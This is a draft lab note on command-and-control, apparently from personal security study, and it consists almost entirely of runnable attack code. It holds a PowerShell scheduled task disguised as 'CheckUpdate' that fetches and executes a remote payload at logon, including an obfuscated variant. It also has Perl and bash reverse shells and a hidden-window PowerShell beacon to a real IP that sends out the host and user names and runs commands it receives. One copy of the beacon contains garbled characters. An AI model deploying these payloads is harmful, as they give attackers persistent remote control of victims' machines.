# Command&Control [draft]

## Setup Lab
- WiFiDuck
- Windows guest
- Remote Host (C2)

Windows Task
$a = New-ScheduledTaskAction -Execute 'powershell' -Argument '$rawcmd = Invoke-webrequest -URI https://raw.githubusercontent.com/roccosicilia/InfoSecStudy/main/Labz/statics/payload_tast_c2_sample.txt -UseBasicParsing; Invoke-Expression $rawcmd;';

$a = New-ScheduledTaskAction -Execute 'powershell' -Argument '$JXA8LuZ6wZqcb2vk6MG1qrV0C3qJ9guNdvJlRLFn3p2mns9HeyFJPfyPEY8TvOnUPVj3fRZWeYU4UYPLf6aSKXhPNRUZGZ9FQoRHKXMfVX3uCMIaP9fEqGULQJMIfbXDoU3XUSW1bOF8U3IZdoCsxVSEF7hXcp9hE9NddNfluRDXBU23u3QbNX0lpyehJCYzYxc9rM5LALWkHt9Nts8Ajpf60MKavUE9vYdUx31rbBp0TRLgSRCPNyQc6aihywFNccrVRUCInuphzzJEH8fOiYk1J3MM1htFvWHoqoUeh9RUNTcVY1IJBYmSDwC7K3ZdmY2fubYdgBkJNhDL1o4nvfXthbYVK = 'Inv'+'OKE-'+'webre'+'QuEsT' -URI https://raw.githubusercontent.com/roccosicilia/InfoSecStudy/main/Labz/statics/payload_tast_c2_sample.txt -UseBasicParsing; 'In'+'VokE-'+'E'+'XpRes'+'sIOn' $JXA8LuZ6wZqcb2vk6MG1qrV0C3qJ9guNdvJlRLFn3p2mns9HeyFJPfyPEY8TvOnUPVj3fRZWeYU4UYPLf6aSKXhPNRUZGZ9FQoRHKXMfVX3uCMIaP9fEqGULQJMIfbXDoU3XUSW1bOF8U3IZdoCsxVSEF7hXcp9hE9NddNfluRDXBU23u3QbNX0lpyehJCYzYxc9rM5LALWkHt9Nts8Ajpf60MKavUE9vYdUx31rbBp0TRLgSRCPNyQc6aihywFNccrVRUCInuphzzJEH8fOiYk1J3MM1htFvWHoqoUeh9RUNTcVY1IJBYmSDwC7K3ZdmY2fubYdgBkJNhDL1o4nvfXthbYVK;';

$t = New-ScheduledTaskTrigger -AtLogon;

Register-ScheduledTask -Action $a -Trigger $t -TaskPath "CheckUpdate" -TaskName "CheckUpdate" -Description "Check update."

## Villain C2

``` perl
# simple perl payload
perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new(PeerAddr=>"*LHOST*",PeerPort=>*LPORT*,Proto=>"tcp");open(STDIN, "<&", $s);open(STDOUT, ">&", $s);open(STDERR, ">&", $s);exec "/bin/bash"'
```

``` bash
# very simple bash payload
nohup /bin/bash -c 'bash -i >& /dev/tcp/*LHOST*/*LPORT* 0>&1 &'
```

test

Start-Process $PSHOME\powershell.exe -ArgumentList {$ConfirmPreference="None";$s='15.160.157.227:8080';$i='892957-d12d93-6f28d8';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/892957/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/d12d93 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/6f28d8 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden

Start'Process $PSHOMEùpowershell.exe -ArgumentList {$ConfirmPreference="None";$s='15.160.157.227:8080';$i='892957-d12d93-6f28d8';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/892957/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/d12d93 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/6f28d8 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden